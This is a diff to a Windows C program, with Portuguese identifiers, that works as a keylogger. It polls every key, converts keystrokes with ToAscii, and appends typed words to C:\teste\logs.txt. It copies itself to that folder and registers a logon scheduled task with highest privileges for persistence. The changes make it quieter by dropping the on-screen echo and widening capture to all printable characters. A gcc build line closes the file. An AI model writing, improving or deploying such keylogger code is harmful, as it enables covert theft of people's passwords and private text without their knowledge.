@@ -6,6 +6,8 @@
 #include <stdbool.h>
 #include <ctype.h>
 
+const char *BASE_FOLDER = "C:\\teste";  
+
 bool valPersis();
 
 int main()
@@ -20,14 +22,19 @@ int main()
         {
             for (int vk = 0x08; vk <= 0xFE; vk++)
             {
-                if (GetAsyncKeyState(vk) & 0x01)
+                if (GetAsyncKeyState(vk) & 0x8000)
                 {
-                    UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
-                    LONG lParam = (scanCode << 16);
-                    char keyName[128];
+                    BYTE keyboardState[256];
+                    GetKeyboardState(keyboardState);
 
-                    if (GetKeyNameTextA(lParam, keyName, sizeof(keyName)) > 0)
+                    UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
+                    WCHAR buffer[5];
+                    int result = ToAscii(vk, scanCode, keyboardState, (LPWORD)buffer, 0);
+
+                    if (result > 0)
                     {
+                        char c = (char)buffer[0];
+
                         // Backspace
                         if (vk == VK_BACK)
                         {
@@ -36,18 +43,18 @@ int main()
                                 count--;
                                 palavra[count] = '\0';
                             }
-                            system("cls");
-                            printf("%s", palavra);
                             continue;
                         }
-
-                        // Enter ou espaço
                         if (vk == VK_RETURN || vk == VK_SPACE)
                         {
                             if (count > 0)
                             {
                                 palavra[count] = '\0';
-                                fptr = fopen("logs.txt", "a");
+
+                                char logPath[MAX_PATH];
+                                snprintf(logPath, sizeof(logPath), "%s\\logs.txt", BASE_FOLDER);
+
+                                fptr = fopen(logPath, "a");
                                 if (fptr)
                                 {
                                     fprintf(fptr, "%s\n", palavra);
@@ -55,31 +62,21 @@ int main()
                                 }
                                 count = 0;
                                 palavra[0] = '\0';
-                                system("cls");
                             }
                             continue;
                         }
 
                         // Letras e números
-                        bool shiftPressed = ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0) ||
-                                            ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
-                        if ((vk >= '0' && vk <= '9') || (vk >= 'A' && vk <= 'Z') || (vk >= 'a' && vk <= 'z'))
+                        if (isprint(c) && count < sizeof(palavra) - 1)
                         {
-                            if (count < sizeof(palavra) - 1)
-                            {
-                                char c = (char)vk;
-                                if (!shiftPressed)
-                                    c = tolower(c);
-                                palavra[count++] = c;
-                                palavra[count] = '\0';
-                            }
+                            palavra[count++] = c;
+                            palavra[count] = '\0';
                         }
-                        system("cls");
-                        printf("%s", palavra);
+
                     }
                 }
             }
-            Sleep(30);
+            Sleep(10);
         }
     }
 
@@ -92,23 +89,22 @@ bool valPersis()
     char linha[50];
     int valor = 0;
 
-    varsConf = fopen("C:\\MyWallpaperFolder\\config.cfg", "r");
+    char configPath[MAX_PATH];
+    snprintf(configPath, sizeof(configPath), "%s\\config.cfg", BASE_FOLDER);
+
+    varsConf = fopen(configPath, "r");
 
     if (!varsConf)
     {
-        // Configuração inicial
         char currentPath[MAX_PATH];
-        char rootPath[MAX_PATH] = "C:\\MyWallpaperFolder";
         char exePath[MAX_PATH];
-        char configPath[MAX_PATH];
 
         GetModuleFileName(NULL, currentPath, MAX_PATH);
-        CreateDirectory(rootPath, NULL);
+        CreateDirectory(BASE_FOLDER, NULL);
 
-        snprintf(exePath, MAX_PATH, "%s\\main.exe", rootPath);
+        snprintf(exePath, MAX_PATH, "%s\\main.exe", BASE_FOLDER);
         CopyFile(currentPath, exePath, FALSE);
 
-        snprintf(configPath, MAX_PATH, "%s\\config.cfg", rootPath);
         varsConf = fopen(configPath, "w");
         if (varsConf)
         {
@@ -116,7 +112,6 @@ bool valPersis()
             fclose(varsConf);
         }
 
-        // Criar tarefa agendada para iniciar com Windows
         char schtasksCmd[MAX_PATH * 2];
         snprintf(schtasksCmd, sizeof(schtasksCmd),
                  "schtasks /create /tn \"MeuProgramaAutoStart\" /tr \"%s\" /sc onlogon /rl highest /f",
@@ -128,7 +123,6 @@ bool valPersis()
     }
     else
     {
-        // Ler config.cfg
         if (fgets(linha, sizeof(linha), varsConf))
         {
             if (sscanf(linha, "pos=%d", &valor) == 1)
@@ -142,3 +136,5 @@ bool valPersis()
 
     return false;
 }
+
+//gcc main.c -o main.exe -lole32 -luuid -lshell32; ./main.exe
